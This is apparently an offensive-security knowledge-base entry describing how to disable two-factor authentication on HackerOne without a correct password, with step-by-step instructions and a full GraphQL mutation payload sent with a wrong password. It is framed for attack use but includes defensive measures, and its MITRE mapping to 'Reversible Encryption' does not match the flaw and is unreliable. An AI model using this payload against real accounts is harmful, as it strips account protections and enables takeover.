---
id: proc-2fa-disable-bypass
tags:
  - auth-bypass
  - 2fa
  - graphql
type: procedure
tools: []
tactics:
  - '[[Defense Evasion]]'
commands:
  - '[[commands/destroy-two-factor-auth-mutation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Reversible Encryption]]'
updated_at: '2025-12-14T17:24:48.418Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Reversible Encryption]]'
---
# Disable-2FA-Without-Password-Verification

## Summary

This procedure exploits a vulnerability in HackerOne's 2FA disable functionality, allowing an authenticated user to remove two-factor authentication without entering a correct password. By submitting a valid backup code paired with an invalid password via a GraphQL mutation, the backend fails to validate the password field, resulting in successful 2FA disablement and reduced account security.

## Description

The attack targets the /settings/auth endpoint on HackerOne, where disabling 2FA prompts for a password and OTP/backup code. Due to a root cause in the GraphQL mutation 'DestroyTwoFactorAuthenticationCredentials', the 'password' input is not checked—only the 'otp_code' is validated. This enables authenticated users to weaken their own or compromised accounts, facilitating easier unauthorized access if backup codes are leaked or phished. The procedure assumes an authenticated session with 2FA enabled and access to a backup code. Post-exploitation, the account relies solely on password authentication, increasing compromise risk.

## Requirements

1. Authenticated HackerOne session with 2FA enabled and backup codes generated
2. Valid backup code from 2FA setup
3. Web browser access to /settings/auth
4. Basic knowledge of GraphQL or browser dev tools to inspect/submit requests

## Defense

Defensive measures and detection strategies:

- Implement server-side validation for all authentication inputs, including password checks during 2FA modifications
- Log and monitor GraphQL mutations for anomalies, such as frequent 2FA disables or invalid password attempts
- Enforce rate limiting on authentication changes and require additional verification (e.g., email confirmation) for 2FA toggles
- Educate users on secure backup code storage and detect phishing attempts targeting codes

## Objectives

1. Disable 2FA without password verification to weaken account protections
2. Demonstrate backend validation flaw in GraphQL API
3. Enable easier account takeover if backup codes are compromised

## Instructions

### Step 1: Enable and Prepare 2FA

**Context**: Ensure 2FA is active to generate usable backup codes.

Navigate to /settings/auth and enable two-factor authentication if not already done. Save one of the generated backup codes.

**Expected Output**: 2FA enabled; backup codes listed.

### Step 2: Trigger Disable Confirmation

**Context**: Open the disable interface to access the vulnerable input fields.

Click the disable icon beside 'Two-factor authentication' on /settings/auth. A confirmation window appears asking for OTP code and password.

**Expected Output**: Modal with input fields for code and password.

### Step 3: Submit Bypass Payload

**Context**: Exploit the mutation by providing invalid password data.

**Command** ([[commands/destroy-two-factor-auth-mutation]]):

Enter a valid backup code (e.g., '123456') in the first field and a random password (e.g., 'wrongpass') in the password field, then submit.

```json
{"query":"mutation Destroy_two_factor_authentication_credentials_mutation($input_0:DestroyTwoFactorAuthenticationCredentialsInput!,$first_1:Int!,$throttle_time_2:Int!,$first_4:Int!,$size_3:ProfilePictureSizes!) {destroyTwoFactorAuthenticationCredentials(input:$input_0) {clientMutationId,...F1,...F2}} fragment F0 on User {id,totp_supported,totp_enabled,remaining_otp_backup_code_count,account_recovery_phone_number,username,name,_profile_picturePkPpF:profile_picture(size:$size_3)} fragment F1 on DestroyTwoFactorAuthenticationCredentialsPayload {me {id,user_type,_program_health_acknowledgements2aGZgn:program_health_acknowledgements(first:$first_1,throttle_time:$throttle_time_2) {edges {node {id,reason,team_member {user {id},id,team {handle,name,sla_failed_count,id}}},cursor},pageInfo {hasNextPage,hasPreviousPage}},new_feature_notification {name,description,url,id},...F0}} fragment F2 on DestroyTwoFactorAuthenticationCredentialsPayload {me {totp_enabled,remaining_otp_backup_code_count,id},was_successful,_errors3exXYb:errors(first:$first_4) {edges {node {type,field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"password":"wrongpass","otp_code":"123456","clientMutationId":"9"},"first_1":1,"throttle_time_2":3600,"first_4":100,"size_3":"small"}}
```

> This GraphQL mutation is sent via the web interface. The backend validates only the otp_code, ignoring password, resulting in 2FA disablement. Expected response includes was_successful: true and totp_enabled: false.

### Step 4: Verify Disablement

**Context**: Confirm the security reduction.

Refresh /settings/auth and check 2FA status.

**Expected Output**: 2FA disabled; no errors on submission.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion]]

### Techniques

- [[Reversible Encryption]]

### Sub-Techniques


## Commands Used

- [[commands/destroy-two-factor-auth-mutation]]

## Tools Used


## Tags

- auth-bypass
- 2fa
- graphql
